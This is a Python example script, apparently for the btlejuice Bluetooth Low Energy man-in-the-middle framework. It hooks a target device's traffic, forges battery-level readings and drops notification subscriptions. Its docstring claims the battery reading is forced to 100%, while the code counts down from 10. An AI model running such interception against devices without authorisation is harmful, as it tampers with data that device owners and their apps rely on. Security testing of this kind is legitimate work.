import argparse
import threading
import time
from btlejuice import (
    BtleJuiceApp, HookingInterface, HookForceResponse, HookModify
)

class MyHookingInterface(HookingInterface):
    """
    We want to hook the battery service and disable all notifications.

    We force the response of the characteristic used to read the
    battery level to 0x64 (100%), while we disable every notification
    subscription (not forwarded to remote device).
    """
    def __init__(self, host, port, target):
        HookingInterface.__init__(self, host, port, target)
        self.batt_level = 10

    def on_proxy_setup(self):
        print('[i] Target found, setting up proxy ...')

    def proxy_ready(self):
        print('[i] Proxy ready !')

    def on_before_read(self, service, characteristic, offset):
        if service.lower() == '180f' and characteristic.lower()=='2a19':
            self.batt_level -= 1
            if self.batt_level < 0:
                self.batt_level = 100
            raise HookForceResponse(chr(self.batt_level))

    def on_before_subscribe(self, service, characteristic, enabled):
        # dismiss
        raise HookForceResponse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Btlejuice-based sniffer')
    parser.add_argument(
        '--server', '-s',
        type=str,
        dest='server',
        default='localhost',
        help='Btlejuice server'
    )
    parser.add_argument(
        '--port',
        '-p',
        type=int,
        dest='port',
        default=8080,
        help='Btlejuice service port'
    )
    parser.add_argument(
        '--target',
        '-t',
        type=str,
        dest='target',
        required=True,
        help='Target device BD address'
    )
    args = parser.parse_args()
    try:
        app = BtleJuiceApp(MyHookingInterface(args.server, args.port, args.target))
        app.setDaemon(True)
        app.start()
        while threading.active_count() > 0:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print('[i] Stopping sniffer ...')
        app.cancel()
